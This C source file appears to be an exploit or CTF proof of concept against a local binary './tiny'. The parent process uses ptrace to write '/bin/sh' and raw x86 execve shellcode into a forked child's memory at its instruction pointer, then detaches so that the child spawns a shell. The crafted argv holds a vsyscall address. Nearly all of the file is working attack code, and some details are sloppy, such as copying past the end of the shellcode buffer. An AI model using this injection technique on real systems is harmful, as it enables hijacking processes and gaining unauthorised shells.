#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <stdio.h>
#include <string.h>
int memcpy_into_target(pid_t pid, void* dest, const void* src, size_t n) {
    /* just like memcpy, but copies it into the space of the target pid */
    /* n must be a multiple of 4, or will otherwise be rounded down to be so */
    int i;
    long *d, *s;
    d = (long*) dest;
    s = (long*) src;
    for (i = 0; i < n / sizeof(long); i++) {
	if (ptrace(PTRACE_POKETEXT, pid, d+i, s[i]) == -1) {
	    perror("ptrace(PTRACE_POKETEXT)");
	    return 0;
	}
    }
    return 1;
}
int wait_for_syscall(pid_t child) {
    int status;
    while (1) {
        ptrace(PTRACE_SYSCALL, child, 0, 0);
        waitpid(child, &status, 0);
        if (WIFSTOPPED(status) && WSTOPSIG(status) & 0x80)
            return 0;
        if (WIFEXITED(status))
            return 1;
    }
}
int main(int argc,char* argv[]){
	pid_t child;
	struct user_regs_struct regs;
	memset(&regs,0,sizeof(struct user_regs_struct));
	child= fork();
	if(child == 0){
	/*
   0x55557b50 <__kernel_vsyscall>:      push   %ecx
   0x55557b51 <__kernel_vsyscall+1>:    push   %edx
   0x55557b52 <__kernel_vsyscall+2>:    push   %ebp
   0x55557b53 <__kernel_vsyscall+3>:    mov    %esp,%ebp
   0x55557b55 <__kernel_vsyscall+5>:    sysenter 
	...
   0x55557b5e <__kernel_vsyscall+14>:   int    $0x80
   0x55557b60 <__kernel_vsyscall+16>:   pop    %ebp
   0x55557b61 <__kernel_vsyscall+17>:   pop    %edx
   0x55557b62 <__kernel_vsyscall+18>:   pop    %ecx
   0x55557b63 <__kernel_vsyscall+19>:   ret    
   */
	execl("./tiny","\x50\x7b\x55\x55", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a","a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a",NULL);
	} else {
		printf("CHILD: %d\n",child);
		int status,ins;
		char shellcode[] = "\xeb\x04\x90\x90\x90\x31\x31\xc0\xbc\x00\x80\x04\x08\x89\xe3\x89\xc1\x89\xc2\xb8\x0b\x00\x00\x00\x90\x90\xcd\x80\x90\x90";

			wait(&status);
            if(WIFEXITED(status))
                return;
            ptrace(PTRACE_GETREGS,
                   child, NULL, &regs);
            ins = ptrace(PTRACE_PEEKTEXT, child, regs.eip, NULL);
		
			ptrace(PTRACE_SETREGS,child,0,&regs);
			printf("EIP: %x\n",regs.eip);
			// use PTRACE_POKETEXT to overwrite text at regs.eip and make string "/bin/sh" as well.
			memcpy_into_target(child,0x08048000,"/bin/sh\x00",8);
			memcpy_into_target(child,regs.eip,shellcode,50);
			ptrace(PTRACE_DETACH,child,0,0);// DETACH
		
		
			//DONE
    }
}
